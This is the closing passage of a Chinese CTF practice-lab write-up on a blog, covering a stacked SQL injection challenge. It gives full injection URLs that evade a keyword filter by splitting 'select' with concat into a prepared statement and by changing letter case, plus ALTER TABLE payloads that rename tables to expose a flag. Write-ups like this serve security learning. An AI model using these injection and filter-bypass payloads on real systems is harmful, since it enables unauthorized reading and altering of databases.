+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set @sql=concat(<span class="string">'sel'</span>,<span class="string">'ect * from `1919810931114514`'</span>);prepare presql from @sql;execute presql;deallocate prepare presql;</span><br><span class="line"><span class="comment">// 提示:strstr($inject, "set") &amp;&amp; strstr($inject, "prepare")</span></span><br><span class="line"><span class="comment">// 用 strstr 来匹配关键字，直接大小写关键字即可绕过</span></span><br></pre></td></tr></table></figure>
+<p>payload:  <a href="http://47.102.141.139:8302/?inject=1&#39;%3bSet+%40sqll%3dconcat(&#39;sel&#39;,&#39;ect+*+from+`1919810931114514`&#39;)%3bPrepare+presql+from+%40sqll%3bexecute+presql%3bdeallocate+Prepare+presql%3b%23" target="_blank" rel="noopener">http://47.102.141.139:8302/?inject=1&#39;%3bSet+%40sqll%3dconcat(&#39;sel&#39;,&#39;ect+*+from+`1919810931114514`&#39;)%3bPrepare+presql+from+%40sqll%3bexecute+presql%3bdeallocate+Prepare+presql%3b%23</a></p>
+<ul>
+<li>alter方法修改表名直接读取flag</li>
+</ul>
+<p>先加id列  <a href="http://47.102.141.139:8302/?inject=1&#39;;alter+table+`1919810931114514`+rename+to+`damya`;alter+table+`words`+rename+to+`damya3`;alter+table+`damya`+rename+to+`words`;%23" target="_blank" rel="noopener">http://47.102.141.139:8302/?inject=1&#39;;alter+table+`1919810931114514`+rename+to+`damya`;alter+table+`words`+rename+to+`damya3`;alter+table+`damya`+rename+to+`words`;%23</a><br>payload:  <a href="http://47.102.141.139:8302/?inject=1&#39;;ALTER" target="_blank" rel="noopener">http://47.102.141.139:8302/?inject=1&#39;;ALTER</a> TABLE <code>1919810931114514</code> ADD <code>id</code> INT(1) NOT NULL DEFAULT ‘1’ AFTER <code>flag</code>;%23</p>
+
+        </div>
+        
+<blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2019-11-14T09:04:45.974Z" itemprop="dateUpdated">2019-11-14 17:04:45</time>
+</span><br>
+
+
+        
+        转载注明出处，原文地址：<a href="/ctf-writeup-web/ckwd913az0019pwucno03qgzq/8307和8302靶场web题wp/" target="_blank" rel="external">https://www.damyahome.github.io/ctf-writeup-web/ckwd913az0019pwucno03qgzq/8307和8302靶场web题wp/</a>
+        
+    </div>
+    <footer>
+        <a href="https://www.damyahome.github.io">
+            <img src="/img/avatar.jpg" alt="Damya">
+            Damya
+        </a>
+    </footer>
+</blockquote>
+
+        
+            <div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+            
+        
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/靶场练习/">靶场练习</a></li></ul>
+
+            <div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://www.damyahome.github.io/ctf-writeup-web/ckwd913az0019pwucno03qgzq/8307和8302靶场web题wp/&title=《8307和8302靶场web题wp》 — Damya's Blog&pic=https://www.damyahome.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://www.damyahome.github.io/ctf-writeup-web/ckwd913az0019pwucno03qgzq/8307和8302靶场web题wp/&title=《8307和8302靶场web题wp》 — Damya's Blog&source=在那远方的天空之下，一朵小花光鲜亮丽。" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+        </div>
+        
+            
+
+
+        
+    </div>
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="prev">
+      <a href="/web学习/ckwd913ee005rpwucm686z7dg/文件包含漏洞小结/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">文件包含漏洞小结</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="next">
+      <a href="/搭建/ckwd913di004spwuclcm0zzvs/ubuntu16-04搭建ssr和docker/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">ubuntu16.04搭建ssr/docker/git配置</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+    
+    
+        <aside class="post-widget">
+            <nav class="post-toc-wrap" id="post-toc">
+                <strong>目录</strong>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#http-47-102-141-139-8307"><span class="post-toc-number">1.</span> <span class="post-toc-text">http://47.102.141.139:8307</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#http-47-102-141-139-8302"><span class="post-toc-number">2.</span> <span class="post-toc-text">http://47.102.141.139:8302</span></a></li></ol>
+            </nav>
+            <div class="toc-bar"><div>
+        </aside>
+    
+</article>
+
+    <div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        让这个世界的bug有趣一点
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/reward-wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/reward-wechat.jpg" data-alipay="/img/reward-alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+    
+
+</div>
+
+    </main>
+    <footer class="footer ">
+    
+    <div class="top">
+        
+            <p>
+    <span>Links：</span>
+    
+    <span class="blogroll-item">
+        <a href="http://www.pdsdt.lovepdsdt.com/" target="_blank">Pdsdt</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://www.starssgo.top/" target="_blank">starssgo</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://phoebe233.cn/" target="_blank">W4nder</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://www.dongzt.cn/" target="_blank">Alkaid</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://whali3n51.top/" target="_blank">Whali3n51</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://www.ap1e.cn/" target="_blank">Aple</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://geeeez.github.io/" target="_blank">Geez</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://kkzevip.com/" target="_blank">MoR03r</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://www.virzz.com/" target="_blank">Virink</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://www.luoluopeach.top/" target="_blank">Luoluo</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://39.97.247.119/" target="_blank">Vigorous</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://www.constantine24.com/" target="_blank">Shanks</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://www.ysllz.com/" target="_blank">ysllz</a>
+    </span>
+    
+</p>
+
+        
+    </div>
+    
+    <div class="bottom">
+        <p>
+            <span>
+                Damya &copy; 2018 - 2021
+            </span>
+        		
+           	
+            
+            
+            <span>
+	            Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/codefine/hexo-theme-mellow" target="_blank">mellow</a>
+            </span>
+            
+            
+            
+
+            
+                
+<span class="site-uv" title="总访客量">
+    <i class="icon icon-user"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>
+
+
+<span class="site-pv" title="总访问量">
+    <i class="icon icon-eye"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
+
+            
+        </p>
+    </div>
+</footer>
+
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://www.damyahome.github.io/ctf-writeup-web/ckwd913az0019pwucno03qgzq/8307和8302靶场web题wp/&title=《8307和8302靶场web题wp》 — Damya's Blog&pic=https://www.damyahome.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://www.damyahome.github.io/ctf-writeup-web/ckwd913az0019pwucno03qgzq/8307和8302靶场web题wp/&title=《8307和8302靶场web题wp》 — Damya's Blog&source=在那远方的天空之下，一朵小花光鲜亮丽。" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPYAAAD2CAAAAADAeSUUAAADOElEQVR42u3awW4iQQwE0Pz/T2evK60GqmxYMc2bUzRJhn6NhHG5f37i6/fi+ve3f99Jfnv1KsnrPn7aCy5sbGzsm7B/H15Xf3PFS35+fOcKM1vn1fOxsbGxz2NffcInReLy0XHxy5+5eRo2NjY2dttatM9JtiwvqNjY2NjYSWvRFp5NhNSGWdjY2Njfxm6/4r8jeMqf8F+zNGxsbOyPZ+dT0c//+S3zbWxsbOwPZv+W1/5ps5HAbGBwuQZsbGzsg9h5AWi/0OftxGzA0BYwbGxs7FPZs4/+d5SlJDB6HG8V7Qo2Njb2oew2uNmXtGTp7XZEpQ4bGxv7IHZeQmbj1XyD9oWwLW/Y2NjYZ7Dzr/uz+7Mi1I6Zky1+0opgY2Nj35bdBvHJixWVs4z+Z4UwapmwsbGxb8vOj+YkS5nh20NCeQR2uQZsbGzsg9izf54FQ7N2JQmV8nECNjY29qnsfBDbtg2zxe2LUxEtYWNjY9+cnWOSRbfRz5MjNYs7T1aCjY2NfRx71mbMAqA2WtqUusstwMbGxj6O3RanNgzaHP1pXzGyYGNjYx/K3hymaUP/5GDNvqW5vIONjY19ELsdDMyahHbk0MZb+bB5OA/BxsbGvhV7XzCS691riMIvbGxs7EPZ7SHIWWSfx1j5QCLfCGxsbOyT2Hkb0LYum/Fwjmk3GhsbG/s8dn4op41v8nAnr7R1ZU5Wgo2NjX0EOyldednYR07tyLltWrCxsbFPYu8Hq21zMhv3tm/JsFZjY2Nj35ydwN7RhMxC/9UbgI2NjX0Qe9aW7FuU9tjNbCBd1CxsbGzsm7P3A9f8QM+rjvW0RffJeAAbGxv7IHZeVNpy0g4ANuPn6L+wsbGxD2U/Lml58Zi1Fm2k1Rawpr5hY2Nj34O9P0azifj3w4BhQcXGxsY+iL0vRckS2zbmVedqXoDHxsbGvgm7jfLzNqMtk/mBnjbMuhwPYGNjYx/EnhWGZBDb3nlVFDXMnLCxsbG/jD2L+PORQ7sdxdqwsbGxv5jdNgab4GlICkIxbGxs7PPYyXKTI49JYDTb4s2xy1WWho2Njf3x7Nkw9VXBULI1ObUoYNjY2NgnsP8AH734dIA5I8oAAAAASUVORK5CYII=" alt="微信分享二维码">
+</div>
+
+
+    
+    <!-- main-js -->
+<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
+<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.4.4"></script>
+<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.4.4"></script>
+<script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.js"></script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<script type="text/javascript" src="/js/method.js?v=1.4.4"></script>
+<script type="text/javascript" src="/js/blog.js?v=1.4.4"></script>
+
+<!-- third-party -->
+
+
+
+
+
+
+<script type="text/javascript" src="/js/plugins/local_search.js?v=1.4.4"></script>
+<script type="text/javascript">
+	var search_path = "search.xml";
+	if (search_path.length === 0) {
+		search_path = "search.xml";
+	}
+	var path = "/" + search_path;
+	searchFunc(path, "local-search-input", "local-search-result");
+</script>
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+    
+    
+
+
+
+
+
+    <!-- mathjax config similar to math.stackexchange -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+            processEscapes: true,
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+
+
+    <script>
+    (function() {
+        var OriginTitile = document.title, titleTime;
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                document.title = '等你回来呀~';
+                clearTimeout(titleTime);
+            } else {
+                document.title = '(つェ⊂)欢迎回来!';
+                titleTime = setTimeout(function() {
+                    document.title = OriginTitile;
+                },2000);
+            }
+        });
+    })();
+</script>
+
+
+
+
+
+    
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/tororo.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
+</html>
